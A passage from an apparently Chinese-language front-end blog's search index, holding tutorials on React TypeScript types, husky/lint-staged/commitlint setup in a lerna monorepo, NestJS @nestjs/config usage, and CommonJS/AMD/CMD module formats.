函数组件defaultProps（Deprecate）如果你需要定义defaultProps，那么不要使用React.FC，因为React.FC对defaultProps的支持不是很好： 1234567const defaultProps = &#123; who: &quot;Johny Five&quot;&#125;;type IProps = &#123; age: number &#125; &amp; typeof defaultProps;export const Greet = (props: IProps) =&gt; &#123; return &lt;div&gt;123&lt;/div&gt; &#125;;Greet.defaultProps = defaultProps; 事实上，一个提议在函数组件中废弃defaultProps的React rfc已经被接受，所以以后还是尽量减少在函数组件上使用defaultProps，使用ES6原生的参数解构+默认参数特性就已经能够满足需要： 1const TestFunction: FunctionComponent&lt;Props&gt; = (&#123; foo = &quot;bar&quot; &#125;) =&gt; &lt;div&gt;&#123;foo&#125;&lt;/div&gt; 类组件12345678910111213141516171819interface IProps &#123; message: string;&#125;interface IState &#123; count: number;&#125;export class MyComponent extends React.Component&lt;IProps, IState&gt; &#123; state: IState = &#123; // duplicate IState annotation for better type inference count: 0 &#125;; render() &#123; return ( &lt;div&gt; &#123;this.props.message&#125; &#123;this.state.count&#125; &lt;/div&gt; ); &#125;&#125; 如果你通过声明state属性来初始化state，那么你需要为这个属性增加IState类型标注。虽然这与前面的React.Component&lt;IProps, IState&gt;有重复的嫌疑，但是这两者实际上是不同的： React.Component&lt;IProps, IState&gt;只是标注了基类的state属性类型。 而当你在子类声明state时，你可以为state标注一个【IState的子类型】作为override。这样，this.state会以子类中的state属性声明作为类型信息的来源。 建议使用函数组件。 可渲染节点类型可渲染节点就是：可以直接被组件渲染函数返回的值。 与可渲染节点有关的类型定义如下（摘录自[@types&#x2F;react](https://github.com/DefinitelyTyped/DefinitelyTyped/blob/8a1b68be3a64e5d2aa1070f68cc935d668a976ad/types/react/index.d.ts#L187）： 12345type ReactText = string | number;type ReactChild = ReactElement | ReactText;interface ReactNodeArray extends Array&lt;ReactNode&gt; &#123;&#125;type ReactFragment = &#123;&#125; | ReactNodeArray;type ReactNode = ReactChild | ReactFragment | ReactPortal | boolean | null | undefined; 组件类型 React.FC&lt;Props&gt;（即 React.FunctionComponent&lt;Props&gt;） React.Component&lt;Props, State&gt; React.ComponentType&lt;Props&gt;（即ComponentClass&lt;P&gt; | FunctionComponent&lt;P&gt;） 在写HOC的时候经常用到。 123const withState = &lt;P extends WrappedComponentProps&gt;( WrappedComponent: React.ComponentType&lt;P&gt;,) =&gt; &#123; ... 获取并扩展原生元素的props类型比如，以下例子获取并扩展了&lt;button&gt;的props类型： 123export const PrimaryButton = ( props: Props &amp; React.HTMLProps&lt;HTMLButtonElement&gt;) =&gt; &lt;Button size=&#123;ButtonSizes.default&#125; &#123;...props&#125; /&gt;; PrimaryButton能够接受所有原生&lt;button&gt;所接受的props。关键在于React.HTMLProps。 获取并扩展第三方组件的props类型123456import &#123; Button &#125; from &quot;library&quot;; // but doesn&#x27;t export ButtonProps! oh no!type ButtonProps = React.ComponentProps&lt;typeof Button&gt;; // no problem! grab your own!type AlertButtonProps = Omit&lt;ButtonProps, &quot;onClick&quot;&gt;; // modifyconst AlertButton: React.FC&lt;AlertButtonProps&gt; = props =&gt; ( &lt;Button onClick=&#123;() =&gt; alert(&quot;hello&quot;)&#125; &#123;...props&#125; /&gt;); 事件类型@types/react提供了各种事件的类型，比如以下是使用React.FormEvent的例子： 1234567891011121314151617181920class App extends React.Component&lt; &#123;&#125;, &#123; text: string &#125;&gt; &#123; state = &#123; text: &#x27;&#x27;, &#125; onChange = (e: React.FormEvent&lt;HTMLInputElement&gt;): void =&gt; &#123; this.setState(&#123; text: e.currentTarget.value &#125;) &#125; render() &#123; return ( &lt;div&gt; &lt;input type=&quot;text&quot; value=&#123;this.state.text&#125; onChange=&#123;this.onChange&#125; /&gt; &lt;/div&gt; ) &#125;&#125; 在React中，所有事件（包括FormEvent、KeyboardEvent、MouseEvent等）都是SyntheticEvent的子类型。他们在@types&#x2F;react中定义如下： 12345678910111213141516171819202122232425262728293031// DOM事件的基本属性都定义在这里interface BaseSyntheticEvent&lt;E = object, C = any, T = any&gt; &#123; nativeEvent: E; currentTarget: C; target: T; bubbles: boolean; cancelable: boolean; defaultPrevented: boolean; eventPhase: number; isTrusted: boolean; preventDefault(): void; isDefaultPrevented(): boolean; stopPropagation(): void; isPropagationStopped(): boolean; persist(): void; timeStamp: number; type: string;&#125;interface SyntheticEvent&lt;T = Element, E = Event&gt; extends BaseSyntheticEvent&lt;E, EventTarget &amp; T, EventTarget&gt; &#123;&#125;// 具体的事件类型：interface FormEvent&lt;T = Element&gt; extends SyntheticEvent&lt;T&gt; &#123;&#125;interface KeyboardEvent&lt;T = Element&gt; extends SyntheticEvent&lt;T, NativeKeyboardEvent&gt; &#123; altKey: boolean; // ...&#125;interface MouseEvent&lt;T = Element, E = NativeMouseEvent&gt; extends SyntheticEvent&lt;T, E&gt; &#123; altKey: boolean; // ...&#125;// ...","tags":["React"],"categories":["React"]},{"title":"lerna项目中集成husky、lint-staged、commitlint和cz-customizable","path":"/2021/04/02/b727669177ea/","content":"Monorepo 是针对单仓库、多 package 的流行解决方案, lerna 是它的一种实现。 说明重要package版本说明： “husky”: “^6.0.0” “lint-staged”: “^10.5.4” “@commitlint&#x2F;cli”: “^12.0.1” “@commitlint&#x2F;config-conventional”: “^12.0.1” “cz-customizable”: “^6.3.0” 配置husky在lerna项目根目录中安装husky: 1yarn add husky -D 注意：husky v4和v6版本的配置方式大相径庭，这里只介绍v6版本的配置方式，v4的网上一搜一大把，这里不过多介绍 在package.json的scripts中添加&quot;prepare&quot;: &quot;husky install&quot;，并运行这条命令： 1npm set-script prepare &quot;husky install&quot; &amp;&amp; npm run prepare 添加一个hook: 1npx husky add .husky/pre-commit &quot;npm test&quot; 上面这个命令会在.husky目录下新建一个pre-commit文件，其内容如下： 12345#!/bin/sh. &quot;$(dirname &quot;$0&quot;)/_/husky.sh&quot;npm test 以上都是手动安装husky的过程，当然官方也提供了一键安装和配置脚本，推荐使用： 123npx husky-init &amp;&amp; npm install # npmnpx husky-init &amp;&amp; yarn # Yarn 1yarn dlx husky-init --yarn2 &amp;&amp; yarn # Yarn 2 如果使用的是v4版本的husky，想升级到v6，可以使用以下命名，一键迁移： 1234567891011121314// npmnpm install husky@6 --save-dev \\ &amp;&amp; npx husky-init \\ &amp;&amp; npm exec -- github:typicode/husky-4-to-6 --remove-v4-config // yarn 1yarn add husky@6 --dev \\ &amp;&amp; npx husky-init \\ &amp;&amp; npm exec -- github:typicode/husky-4-to-6 --remove-v4-config// yarn 2yarn add husky@6 --dev \\ &amp;&amp; yarn dlx husky-init --yarn2 \\ &amp;&amp; npm exec -- github:typicode/husky-4-to-6 --remove-v4-config 更多配置，详见官方文档：https://typicode.github.io/husky/#/ 配置lint-staged在lerna项目中，由于所有子项目公用一个 repo 源代码仓库，因此它的 husky 钩子只能建立在最顶层目录； 而每次 commit 都很有可能是多个子项目都有改动，这个时候使用 lint-staged 时，就不但要区分文件类型，还要区分改动文件所在的子项目（因为不同的子项目可能会有不同的校验处理）。 这时，我们可以使用 lerna 命令来实现对“哪个子项目有修改”的判断；而 lint-staged 就需要安装在任何一个需要做校验的子项目中。 添加或修改.husky目录下的pre-commit钩子如下： 12345#!/bin/sh. &quot;$(dirname &quot;$0&quot;)/_/husky.sh&quot;lerna run --concurrency 1 --stream precommit --since HEAD --exclude-dependents 其中，precommit 是在pre-commit钩子中触发的子项目的命令 在子项目中安装和配置lint-staged，并添加precommit命令 安装lint-staged： 1lerna add lint-staged --scope=xxxx -D 在添加precommit命令： 1&quot;precommit&quot;: &quot;lint-staged&quot; 配置lint-staged： 12345&quot;lint-staged&quot;: &#123; &quot;*.&#123;ts,tsx,js,jsx&#125;&quot;: [ &quot;eslint&quot; ]&#125;, 更多配置，详见官方文档：https://github.com/okonet/lint-staged#readme 配置commitlint和cz-customizable每个团队对提交的commit message格式有约定俗称的要求，但是没有一个统一的规范，导致大家提交的commit message或多或少不太一样。因此，需要一个工具来帮助大家统一commit message的格式，也方便后续的分析和拓展。 cz-customizable是一个帮助书写commit message的工具，而commitlint是一个校验commit message的工具。 安装commitlint和cz-customizable: 1yarn add @commitlint/cli @commitlint/config-conventional cz-customizable -D 添加commit-msg钩子 1npx husky add .husky/commit-msg &quot;yarn commitlint --edit&quot; 生成如下文件： 1234#!/bin/sh. &quot;$(dirname &quot;$0&quot;)/_/husky.sh&quot;yarn commitlint --edit 在package.json中添加以下配置： 123456789101112&#123; ... &quot;config&quot;: &#123; &quot;commitizen&quot;: &#123; &quot;path&quot;: &quot;./node_modules/cz-customizable&quot; &#125;, &quot;cz-customizable&quot;: &#123; &quot;config&quot;: &quot;./.cz-config.js&quot; &#125; &#125;, ...&#125; 在项目根目录中新建.cz-config.js文件，内容如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051module.exports = &#123; types: [ &#123; value: &#x27;feat&#x27;, name: &#x27;feat: A new feature&#x27; &#125;, &#123; value: &#x27;fix&#x27;, name: &#x27;fix: A bug fix&#x27; &#125;, &#123; value: &#x27;style&#x27;, name: &#x27;style: Changes that do not affect the meaning of the code (white-space, formatting, missing semi-colons, etc)&#x27;, &#125;, &#123; value: &#x27;refactor&#x27;, name: &#x27;refactor: A code change that neither fixes a bug nor adds a feature&#x27;, &#125;, &#123; value: &#x27;revert&#x27;, name: &#x27;revert: Revert to a commit&#x27; &#125;, &#123; value: &#x27;chore&#x27;, name: &#x27;chore: Changes to the build process or auxiliary tools and libraries such as documentation generation&#x27;, &#125;, &#123; value: &#x27;docs&#x27;, name: &#x27;docs: Documentation only changes&#x27; &#125;, &#123; value: &#x27;perf&#x27;, name: &#x27;perf: A code change that improves performance&#x27;, &#125;, &#123; value: &#x27;test&#x27;, name: &#x27;test: Adding missing tests&#x27; &#125;, ], scopes: [ &#123; name: &#x27;frontend&#x27; &#125;, &#123; name: &#x27;backend&#x27; &#125;, &#123; name: &#x27;service&#x27; &#125;, ], messages: &#123; type: &quot;Select the type of change that you&#x27;re committing:&quot;, scope: &quot; Select the scope of change that you&#x27;re committing:&quot;, // used if allowCustomScopes is true customScope: &#x27;Denote the custom scope:&#x27;, subject: &#x27;Write a SHORT, IMPERATIVE tense description of the change: &#x27;, body: &#x27;Provide a LONGER description of the change (optional). Use &quot;|&quot; to break new line: &#x27;, breaking: &#x27;List any BREAKING CHANGES (optional): &#x27;, footer: &#x27;List any ISSUES CLOSED by this change (optional). E.g.: #31, #34: &#x27;, confirmCommit: &#x27;Are you sure you want to proceed with the commit above?&#x27;, &#125;, allowCustomScopes: true,&#125; 在项目根目录中新建.commitlintrc.js文件，内容如下： 1234567891011const typeEnum = require(&#x27;./.cz-config&#x27;);module.exports = &#123; extends: [&#x27;@commitlint/config-conventional&#x27;], rules: &#123; &#x27;type-enum&#x27;: [2, &#x27;always&#x27;, typeEnum.types.map((i) =&gt; i.value)], &#x27;scope-enum&#x27;: [2, &#x27;always&#x27;, typeEnum.scopes.map((i) =&gt; i.name)], &#x27;scope-empty&#x27;: [2, &#x27;never&#x27;], &#125;,&#125;; 配置完成后，每次提交commit时，可以使用git cz替换git commit命令，从而辅助我们更加规范的书写commit message。 更多详细配置，可以参考这篇文章：https://juejin.cn/post/6844903831893966856 总结以上就是我对如何在lerna项目中配置husky、lint-staged和Cz工具的一些粗略认知，当然不仅仅是lerna项目，也适用于任何前端项目。 链接 husky官文文档 lint-staged官方文档 Cz工具集使用介绍"},{"title":"NestJS - 配置","path":"/2021/03/17/1255498d9728/","content":"应用程序通常运行在不同的环境，例如，开发有开发环境、测试环境，线上有预发布环境、生产环境，而运行在不同的环境，需要有不同的配置，例如数据库的配置等。 在Node中，外部定义的环境变量通过procress.env全局可见。在Node.js应用程序中，通常使用.env文件来配置这些环境变量，其中每个键代表一个特定的值，以代表每个环境。 解析.env文件并加载到procress.env中，就需要使用dotenv这个包了，但是Nest提供了一个配置环境变量的软件包 - @nestjs/config，其内部依赖了dotenv。 安装@nestjs/config12345// npm$ npm i --save @nestjs/config// yarn$ yarn add @nestjs/config 简单使用安装完成后，我们可以导入ConfigModule。通常，我们将其导入根目录AppModule并使用. forRoot()静态方法控制其行为。在此步骤中，将解析并生成环境变量键&#x2F;值对。稍后，我们将在其他功能模块中看到一些用于访问的ConfigService类的选项ConfigModule。 1234567import &#123; Module &#125; from &#x27;@nestjs/common&#x27;;import &#123; ConfigModule &#125; from &#x27;@nestjs/config&#x27;;@Module(&#123; imports: [ConfigModule.forRoot()],&#125;)export class AppModule &#123;&#125; 上面的代码将从.env默认位置（项目根目录）加载并解析文件，将文件中的键&#x2F;值对.env与分配给其的环境变量合并process.env，并将结果存储在私有结构中，您可以通过访问该私有结构ConfigService。该forRoot()方法注册了ConfigService提供程序，该提供程序提供了get()一种读取这些已解析&#x2F;合并的配置变量的方法。由于@nestjs/config依赖于dotenv，因此它使用该程序包的规则来解决环境变量名称中的冲突。当密钥在运行时环境中作为环境变量（例如，通过OS shell导出之类export DATABASE_USER&#x3D;test）和在.env文件中同时存在时，运行时环境变量优先。 示例.env文件如下所示： 12DATABASE_USER=testDATABASE_PASSWORD=test 自定义ENV文件路径默认情况下，程序会在应用程序的根目录中查找.env文件。要为.env文件指定其他路径，请设置forRoot()的可选属性envFilePath，如下所示： 123ConfigModule.forRoot(&#123; envFilePath: &#x27;.development.env&#x27;,&#125;); 您还可以为.env文件指定多个路径，如下所示： 123ConfigModule.forRoot(&#123; envFilePath: [&#x27;.env.development.local&#x27;, &#x27;.env.development&#x27;],&#125;); 如果在多个文件中找到一个变量，则第一个优先。 在实际开发中，往往有多个配置文件，比如开发环境使用.development.env配置文件，测试环境使用.test.env配置文件，生产环境使用.production.env配置文件，然后使用不同的启动命令，启用不同的配置文件，示例如下： 1234567891011// package.json&#123; ... &quot;scripts&quot;: &#123; &quot;start&quot;: &quot;cross-env NODE_ENV=development nest start&quot;, &quot;start:dev&quot;: &quot;cross-env NODE_ENV=development nest start --watch&quot;, &quot;start:prod&quot;: &quot;cross-env NODE_ENV=production node dist/main&quot;, &quot;test&quot;: &quot;cross-env NODE_ENV=test jest&quot;, &#125;, ...&#125; 安装cross-env，使用它跨平台的设置环境变量 123ConfigModule.forRoot(&#123; envFilePath: `$&#123;process.env.NODE_ENV || &#x27;development&#x27;&#125;.env`,&#125;); 使用全局module如果要ConfigModule在其他模块中使用，则需要将其导入（这是所有Nest模块的标准配置）。或者，通过将options对象的isGlobal属性设置为true，将其声明为全局模块，如下所示。在这种情况下，一旦ConfigModule被加载到根模块中，就不需要在其他模块中导入ConfigModule了 123ConfigModule.forRoot(&#123; isGlobal: true,&#125;); 自定义配置文件对于更复杂的项目，可以使用自定义配置文件返回嵌套的配置对象。这允许您按功能对相关配置设置进行分组（例如，与数据库相关的设置），并将相关设置存储在单个文件中，以帮助独立管理它们。 自定义配置文件导出一个工厂函数，该函数返回一个配置对象。配置对象可以是任何任意嵌套的普通JavaScript对象。process.env对象将包含完全解析的环境变量key-value对（如上所述，.env文件和外部定义的变量被解析和合并）。由于你控制了返回的配置对象，你可以添加任何所需的逻辑来将值投射到一个适当的类型，设置默认值等。例如 1234567export default () =&gt; (&#123; port: parseInt(process.env.PORT, 10) || 3000, database: &#123; host: process.env.DATABASE_HOST, port: parseInt(process.env.DATABASE_PORT, 10) || 5432 &#125;&#125;); 将其传给ConfigModule.forRoot()的load属性，来加载这个自定义配置： 12345678910import configuration from &#x27;./config/configuration&#x27;;@Module(&#123; imports: [ ConfigModule.forRoot(&#123; load: [configuration], &#125;), ],&#125;)export class AppModule &#123;&#125; load属性是个数组，允许加载多个自定义配置文件 通过自定义配置文件，我们还可以管理自定义文件，如YAML文件。下面是一个使用YAML格式的配置的例子。 123456789101112http: host: &#x27;localhost&#x27; port: 8080db: postgres: url: &#x27;localhost&#x27; port: 5432 database: &#x27;yaml-db&#x27; sqlite: database: &#x27;sqlite.db&#x27; 为了读取和解析YAML文件，我们可以利用js-yaml包。 12$ npm i js-yaml$ npm i -D @types/js-yaml 安装软件包后，我们将使用yaml#load函数来加载刚刚在上面创建的YAML文件。 1234567891011import &#123; readFileSync &#125; from &#x27;fs&#x27;;import * as yaml from &#x27;js-yaml&#x27;;import &#123; join &#125; from &#x27;path&#x27;;const YAML_CONFIG_FILENAME = &#x27;config.yml&#x27;;export default () =&gt; &#123; return yaml.load( fs.readFileSync(join(__dirname, YAML_CONFIG_FILENAME), &#x27;utf8&#x27;), );&#125;; 使用ConfigService要从ConfigService中访问配置值，我们首先得注入ConfigService，和使用其他provider一样，我们需要将其加入@Module的imports属性中（如果将ConfigModule配置成全局module，则可以忽略这一步） 1234@Module(&#123; imports: [ConfigModule], // ...&#125;) 然后我们可以使用标准的构造函数注入: 123// import &#123; ConfigService &#125; from &#x27;@nestjs/config&#x27;;constructor(private configService: ConfigService) &#123;&#125; 获取 12345// get an environment variableconst dbUser = this.configService.get&lt;string&gt;(&#x27;DATABASE_USER&#x27;);// get a custom configuration valueconst dbHost = this.configService.get&lt;string&gt;(&#x27;database.host&#x27;); 如上所示，使用configService.get()方法通过传递变量名来获取一个简单的环境变量。你可以通过传递类型来做TypeScript类型提示，如上所示(例如，get&lt;string&gt;(…))。get()方法也可以遍历一个嵌套的自定义配置对象（通过自定义配置文件创建），如上面第二个例子所示。 你也可以使用一个接口作为类型提示来获得整个嵌套的自定义配置对象。 123456789interface DatabaseConfig &#123; host: string; port: number;&#125;const dbConfig = this.configService.get&lt;DatabaseConfig&gt;(&#x27;database&#x27;);// you can now use `dbConfig.port` and `dbConfig.host`const port = dbConfig.port; get()方法还需要一个可选的第二个参数，定义一个默认值，当键不存在时，将返回默认值，如下所示: 12// use &quot;localhost&quot; when &quot;database.host&quot; is not definedconst dbHost = this.configService.get&lt;string&gt;(&#x27;database.host&#x27;, &#x27;localhost&#x27;); ConfigService有一个可选的泛型(类型参数)来帮助防止访问不存在的配置属性。使用方法如下: 12345678910111213interface EnvironmentVariables &#123; PORT: number; TIMEOUT: string;&#125;// somewhere in the codeconstructor(private configService: ConfigService&lt;EnvironmentVariables&gt;) &#123; // this is valid const port = this.configService.get&lt;number&gt;(&#x27;PORT&#x27;); // this is invalid as URL is not a property on the EnvironmentVariables interface const url = this.configService.get&lt;string&gt;(&#x27;URL&#x27;);&#125; 配置命名空间ConfigModule允许您定义和加载多个自定义配置文件，如上面的自定义配置文件所示。您可以使用嵌套的配置对象管理复杂的配置对象层次，如该节所示。另外，您也可以使用 registerAs()函数返回一个 “namespaced “的配置对象，如下所示。 123456import &#123; registerAs &#125; from &#x27;@nestjs/config&#x27;; export default registerAs(&#x27;database&#x27;, () =&gt; (&#123; host: process.env.DATABASE_HOST, port: process.env.DATABASE_PORT || 5432&#125;)); 用forRoot()方法的参数对象的load属性加载一个命名空间的配置，与加载自定义配置文件的方式相同。 12345678910import databaseConfig from &#x27;./config/database.config&#x27;;@Module(&#123; imports: [ ConfigModule.forRoot(&#123; load: [databaseConfig], &#125;), ],&#125;)export class AppModule &#123;&#125; 现在，要从database命名空间中获取host，使用点操作符。使用database作为属性名的前缀，对应于命名空间的名称（作为 registerAs() 函数的第一个参数传递）。 1const dbHost = this.configService.get&lt;string&gt;(&#x27;database.host&#x27;); 一个合理的选择是直接注入database命名空间。这使我们能够从强类型化中获益。 123456// import &#123; ConfigType &#125; from &#x27;@nestjs/config&#x27;;constructor( @Inject(databaseConfig.KEY) private dbConfig: ConfigType&lt;typeof databaseConfig&gt;,) &#123;&#125; 缓存环境变量由于访问process.env会很慢，你可以设置传递给ConfigModule.forRoot()的options对象的cache属性，以提高ConfigService的性能。 123ConfigModule.forRoot(&#123; cache: true,&#125;); 部分注册到目前为止，我们已经用forRoot()方法处理了根模块(如AppModule)中的配置文件。也许你有一个更复杂的项目结构，特定功能的配置文件位于多个不同的目录中。@nestjs/config包提供了一个叫做部分注册的功能，它只引用与每个功能模块相关联的配置文件，而不是在根模块中加载所有这些文件。在特性模块中使用forFeature()静态方法来执行这个部分注册，如下所示。 123456import databaseConfig from &#x27;./config/database.config&#x27;;@Module(&#123; imports: [ConfigModule.forFeature(databaseConfig)],&#125;)export class DatabaseModule &#123;&#125; 校验环境变量如果所需的环境变量没有被提供或不符合某些验证规则，在应用程序启动时抛出异常是标准做法。@nestjsconfig包有两种不同的方式来实现这一点。 Joi内置验证器。使用Joi，你可以定义一个对象模式，并对其进行JavaScript对象验证。 一个自定义的validate()函数，它接受环境变量作为输入。 要使用Joi，我们必须安装Joi包: 1$ yarn add joi 最新版本的joi需要你运行Node v12或更高版本。旧版本的node请安装v16.1.8。这主要是在v17.0.2发布后，在构建的时候会出现错误。更多信息请参考其17.0.0发布说明(https://github.com/sideway/joi/issues/2262)。 现在我们可以定义一个Joi验证模式，并通过forRoot()方法的选项对象的validationSchema属性传递，如下图所示。 123456789101112131415import * as Joi from &#x27;joi&#x27;;@Module(&#123; imports: [ ConfigModule.forRoot(&#123; validationSchema: Joi.object(&#123; NODE_ENV: Joi.string() .valid(&#x27;development&#x27;, &#x27;production&#x27;, &#x27;test&#x27;, &#x27;provision&#x27;) .default(&#x27;development&#x27;), PORT: Joi.number().default(3000), &#125;), &#125;), ],&#125;)export class AppModule &#123;&#125; 默认情况下，所有的 schema keys 都被认为是可选的。这里，我们为 NODE_ENV和PORT设置了默认值，如果我们不在环境(.env文件或进程环境)中提供这些变量，就会使用这些变量。另外，我们也可以使用 required() 验证方法来要求必须在环境 (.env 文件或进程环境) 中定义一个值。在这种情况下，如果我们没有在环境中提供变量，验证步骤将抛出一个异常。关于如何构造验证模式，请参见Joi验证方法。 默认情况下，允许未知的环境变量（模式中键不存在的环境变量），并且不会触发验证异常。默认情况下，所有的验证错误都会被报告。你可以通过forRoot()选项对象的validationOptions键传递一个选项对象来改变这些行为。这个选项对象可以包含Joi验证选项提供的任何标准验证选项属性。例如，要反转上面的两个设置，可以传递这样的选项。 12345678910111213141516171819import * as Joi from &#x27;joi&#x27;;@Module(&#123; imports: [ ConfigModule.forRoot(&#123; validationSchema: Joi.object(&#123; NODE_ENV: Joi.string() .valid(&#x27;development&#x27;, &#x27;production&#x27;, &#x27;test&#x27;, &#x27;provision&#x27;) .default(&#x27;development&#x27;), PORT: Joi.number().default(3000), &#125;), validationOptions: &#123; allowUnknown: false, abortEarly: true, &#125;, &#125;), ],&#125;)export class AppModule &#123;&#125; @nestjsconfig包使用的默认设置是: allowUnknown：控制是否允许在环境变量中使用未知键。默认为true。 abortEarly： 如果为true，则在第一个错误时停止验证；如果为false，则返回所有错误。默认值为false。 请注意，一旦你决定传递一个validationOptions对象，你没有明确传递的任何设置都将默认为Joi标准默认值（而不是@nestjsconfig默认值）。例如，如果你在你的自定义validationOptions对象中没有指定allowUnknowns，它将有Joi默认值false。因此，在您的自定义对象中指定这两个设置可能是最安全的。 自定义校验函数另外，你也可以指定一个同步的validate函数，该函数接收一个包含环境变量的对象（来自env文件和进程），并返回一个包含验证过的环境变量的对象，这样你就可以在需要的时候转换它们。如果函数抛出一个错误，它将阻止应用程序的引导。 在这个例子中，我们将继续使用class-transformer和class-validator包。首先，我们必须定义。 一个具有验证约束的类， 一个使用 plainToClass 和 validateSync 函数的验证函数。 12345678910111213141516171819202122232425262728293031import &#123; plainToClass &#125; from &#x27;class-transformer&#x27;;import &#123; IsEnum, IsNumber, validateSync &#125; from &#x27;class-validator&#x27;;enum Environment &#123; Development = &quot;development&quot;, Production = &quot;production&quot;, Test = &quot;test&quot;, Provision = &quot;provision&quot;,&#125;class EnvironmentVariables &#123; @IsEnum(Environment) NODE_ENV: Environment; @IsNumber() PORT: number;&#125;export function validate(config: Record&lt;string, unknown&gt;) &#123; const validatedConfig = plainToClass( EnvironmentVariables, config, &#123; enableImplicitConversion: true &#125;, ); const errors = validateSync(validatedConfig, &#123; skipMissingProperties: false &#125;); if (errors.length &gt; 0) &#123; throw new Error(errors.toString()); &#125; return validatedConfig;&#125; 完成这些之后，使用validate函数作为ConfigModule的配置选项，如下所示: 12345678910import &#123; validate &#125; from &#x27;./env.validation&#x27;;@Module(&#123; imports: [ ConfigModule.forRoot(&#123; validate, &#125;), ],&#125;)export class AppModule &#123;&#125; 自定义getter函数ConfigService定义了一个通用的get()方法，通过键来检索配置值。我们还可以添加getter函数，以实现更自然的编码风格。 12345678@Injectable()export class ApiConfigService &#123; constructor(private configService: ConfigService) &#123;&#125; get isAuthEnabled(): boolean &#123; return this.configService.get(&#x27;AUTH_ENABLED&#x27;) === &#x27;true&#x27;; &#125;&#125; 现在我们可以使用getter函数如下: 12345678@Injectable()export class AppService &#123; constructor(apiConfigService: ApiConfigService) &#123; if (apiConfigService.isAuthEnabled) &#123; // Authentication is enabled &#125; &#125;&#125; 可扩展变量@nestjsconfig支持环境变量扩展。通过这种技术，你可以创建嵌套的环境变量，其中一个变量被引用到另一个变量的定义中。比如说 12APP_URL=mywebsite.comSUPPORT_EMAIL=support@$&#123;APP_URL&#125; 通过这种结构，变量SUPPORT_EMAIL解析为support@mywebsite.com。请注意使用 $&#123;...&#125; 语法来触发解析 SUPPORT_EMAIL 定义中的变量 APP_URL 的值。 对于这个功能，@nestjsconfig包内部使用dotenv-expand。 使用传递给ConfigModule的forRoot()方法的选项对象中的expandVariables属性启用环境变量扩展，如下所示。 123456789@Module(&#123; imports: [ ConfigModule.forRoot(&#123; // ... expandVariables: true, &#125;), ],&#125;)export class AppModule &#123;&#125; 在 main.ts 中使用虽然我们的配置是存储在service中的，但它仍然可以在main.ts文件中使用。这样，你就可以用它来存储变量，如应用程序端口或CORS host。 要访问它，你必须使用app.get()方法，然后是服务引用。 1const configService = app.get(ConfigService); 然后，你可以像往常一样，通过调用配置键的get方法来使用它。 1const port = configService.get(&#x27;PORT&#x27;); 本文基本上是官文文档中有关配置部分的中文翻译（https://docs.nestjs.com/techniques/configuration），有时间再写个实战文章。"},{"title":"Javascript 模块管理","path":"/2020/08/29/d906451e51cd/","content":"CommonJSCommonJS是Node.js对模块开发的标准规范。 CommonJS module基本要求如下： 一个文件就是一个模块，拥有单独的作用域 普通方式定义的 变量、函数、对象都属于该模块内 通过 require 来加载模块 通过 exports 和 module.exports 来暴露模块中的内容 demo1: 1234567891011121314// module.jsmodule.exports = &#123; name: &quot;zhang&quot;, getName: function() &#123; console.log(this.name); &#125;, changeName: function(n) &#123; this.name = n; &#125;&#125;;// index.jsconst module = require(&quot;./module/index&quot;);console.log(module)\t// &#123;name: &quot;zhang&quot;, getName: ƒ, changeName: ƒ&#125; &quot;commons&quot; demo2: 1234567891011121314// module1.jsconst getParam = () =&gt; &#123; console.log(a);&#125;;let a = 123;let b = 456;exports.a = a;exports.b = b;exports.getParam = getParam;// index.jsconst module1 = require(&quot;./module/index1&quot;);consoel.log(module1, &quot;commons1&quot;)\t// &#123;a: 123, b: 456, getParam: ƒ&#125; &quot;commons1&quot; demo3: 1234567891011121314151617// module2.jslet a = 123;const getSome = () =&gt; &#123; console.log(&quot;yyy&quot;);&#125;;const getA = () =&gt; &#123; console.log(a);&#125;;exports.getSome = getSome;module.exports = getA;// index.jsconst module2 = require(&quot;./module/index2&quot;);consoel.log(module2, &quot;commons2&quot;)\t// function getA() &#123;...&#125; 总结 ： 通过这样的一个对比的例子就可以比较清晰的对比出 exports 和 module.exports 的区别:1、当 exports 和 module.exports 同时存在的时候，module.exports 会盖过 exports2、当模块内部全部是 exports 的时候， 就等同于 module.exports3、最后 我们就可以认定为 exports 其实就是 module.exports 的子集。 AMDAMD全称为异步模块定义, 是专门为浏览器中JavaScript环境设计的规范。 AMD设计出一个简洁的写模块API： define(id?, dependencies?, factory); 其中： id: 模块标识，可以省略。 dependencies: 所依赖的模块，可以省略。 factory: 模块的实现，或者一个JavaScript对象。如果为函数，它应该只被执行一次，如果是对象，此对象应该为模块的输出值。 使用RequireJS的require函数加载模块: require([dependencies], callback); dependencies: 表示所依赖的模块 callback: 一个回调函数，当前面指定的模块都加载成功后，它将被调用。加载的模块会以参数形式传入该函数，从而在回调函数内部就可以使用这些模块 base.js 123456define(function() &#123; return &#123; mix: function(source, target) &#123; &#125; &#125;;&#125;); ui.js 1234567define([&#x27;base&#x27;], function(base) &#123; return &#123; show: function() &#123; // todo with module base &#125; &#125;&#125;); page.js 123define([&#x27;data&#x27;, &#x27;ui&#x27;], function(data, ui) &#123; // init here&#125;) data.js 1234define(&#123; users: [], members: []&#125;); 以上同时演示了define的三种用法 定义无依赖的模块（base.js） 定义有依赖的模块（ui.js，page.js） 定义数据对象模块（data.js） CMDAMD开始为摆脱CommonJS的束缚，开创性的提出了自己的模块风格。但后来又做了妥协，兼容了 CommonJS Modules&#x2F;Wrappings 。所以就有了CMD, 它的语法如下: define(id?, dependencies?, factory); 因为CMD推崇一个文件一个模块，所以经常就用文件名作为模块id； CMD推崇依赖就近，所以一般不在define的参数中写依赖，而是在factory中写。 factory有三个参数： 1function(require, exports, module)&#123;&#125; require: require 是一个方法，接受 模块标识 作为唯一参数，用来获取其他模块提供的接口； exports: exports 是一个对象，用来向外提供模块接口； module: module 是一个对象，上面存储了与当前模块相关联的一些属性和方法。 demo: 123456define(function(require, exports, module) &#123; var base = require(&#x27;base&#x27;); exports.show = function() &#123; // todo with module base &#125;&#125;); AMD推崇依赖前置，在定义模块的时候就要声明其依赖的模块. CMD推崇就近依赖，只有在用到某个模块的时候再去require. AMD和CMD最大的区别是对依赖模块的执行时机处理不同，注意不是加载的时机或者方式不同很多人说requireJS是异步加载模块，SeaJS是同步加载模块，这么理解实际上是不准确的，其实加载模块都是异步的，只不过AMD依赖前置，js可以方便知道依赖模块是谁，立即加载，而CMD就近依赖，需要使用把模块变为字符串解析一遍才知道依赖了那些模块，这也是很多人诟病CMD的一点，牺牲性能来带来开发的便利性，实际上解析模块用的时间短到可以忽略。 ES Module在 ES2015 